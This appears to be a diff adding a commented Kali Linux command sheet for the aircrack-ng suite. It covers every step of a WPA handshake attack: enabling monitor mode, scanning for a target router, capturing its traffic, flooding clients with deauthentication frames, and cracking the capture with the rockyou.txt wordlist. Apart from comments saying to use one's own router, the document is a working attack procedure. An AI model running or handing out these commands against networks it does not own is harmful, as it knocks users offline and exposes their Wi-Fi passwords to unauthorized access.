@@ -1,0 +1,36 @@
+# See what network interfaces are on the Kali machine
+ip addr
+
+# Kill any processes that could interfere with Wi-Fi adapter
+sudo airmon-ng check kill
+
+# Start the Wi-Fi adapter interface in monitor mode
+sudo airmon-ng start wlan0
+
+# Verify that monitor mode is running on wlan0
+sudo airmon-ng
+
+# See all nearby available networks and get the routers's MAC address and channel
+sudo airodump-ng wlan0mon
+
+# Test to see device connectivity with the router by authenticating to it using your phone or another device
+sudo airodump-ng wlan0mon -d 60:83:E7:0B:47:62
+
+# 1st terminal
+# Replace the channel number and BSSID with your own Router's info
+# Replace hack1 with your desired file name for the capture
+sudo airodump-ng -w hack1 -c 3 --bssid 60:83:E7:0B:47:62 wlan0mon
+
+# 2nd terminal
+# Replace the BSSID with your own Router's
+sudo aireplay-ng --deauth 0 -a 60:83:E7:0B:47:62 wlan0mon
+
+# Use Wireshark to open the captured file
+wireshark hack1-01.cap
+
+# Stop monitor mode for the wlan0 interface 
+airmon-ng stop wlan0mon
+
+# Crack the file with rockyou.txt
+# Replace hack1-01.cap with your file name
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
